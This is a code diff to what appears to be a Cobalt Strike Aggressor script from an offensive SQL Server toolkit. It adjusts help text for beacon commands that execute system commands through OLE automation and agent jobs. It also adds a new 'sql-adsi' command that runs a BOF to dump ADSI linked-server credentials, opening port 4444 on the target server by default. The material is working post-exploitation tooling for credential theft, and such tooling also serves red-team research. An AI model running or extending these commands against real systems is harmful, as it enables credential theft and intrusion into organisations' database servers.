@@ -615,7 +615,7 @@ beacon_command_register(
 	"sql-olecmd", 
 	"Execute a system command using OLE automation procedures", 
 	"sql-olecmd [server] [command] [opt: database] [opt: linkedserver] [opt: impersonate]\n\n" .
-	" Output is not returned"
+	"Output is not returned"
 );
 
 alias sql-clr {
@@ -696,7 +696,7 @@ beacon_command_register(
 	"sql-agentcmd", 
 	"Execute a system command using agent jobs", 
 	"sql-agentcmd [server] [command] [opt: database] [opt: linkedserver] [opt: impersonate]\n\n" .
-	" Output is not returned"
+	"Output is not returned"
 );
 
 alias sql-agentstatus {
@@ -723,4 +723,33 @@ beacon_command_register(
 	"sql-agentstatus", 
 	"Enumerate SQL agent status and jobs", 
 	"sql-agentstatus [server] [opt: database] [opt: linkedserver] [opt: impersonate]"
+);
+
+alias sql-adsi {
+    local('$args $barch $server $adsiserver $port $database $link $impersonate');
+	
+	if(size(@_) < 3)
+	{
+		berror($1, beacon_command_detail("sql-adsi"));
+		return;
+	}
+	$barch  = barch($1);
+	$server = $2;
+	$adsiserver = $3
+	$port = iff(-istrue $4, $4, "4444");
+	$database = iff(-istrue $5, $5, "");
+    $link = iff(-istrue $6, $6, "");
+    $impersonate = iff(-istrue $7, $7, "");
+    
+	btask($1, "Tasked beacon to dump ADSI creds on " . $server);
+	
+	$args = bof_pack($1, "zzzzzz", $server, $adsiserver, $port, $database, $link, $impersonate);
+	beacon_inline_execute($1, readbof($1, "adsi"), "go", $args);
+}
+
+beacon_command_register(
+	"sql-adsi", 
+	"Obtain ADSI creds from ADSI linked server", 
+	"sql-adsi [server] [ADSI_linkedserver] [opt: port] [opt: database] [opt: linkedserver] [opt: impersonate]\n\n" .
+	"Port defaults to 4444. This gets opened on the SQL Server with the ADSI link, not the beaconing host"
 );
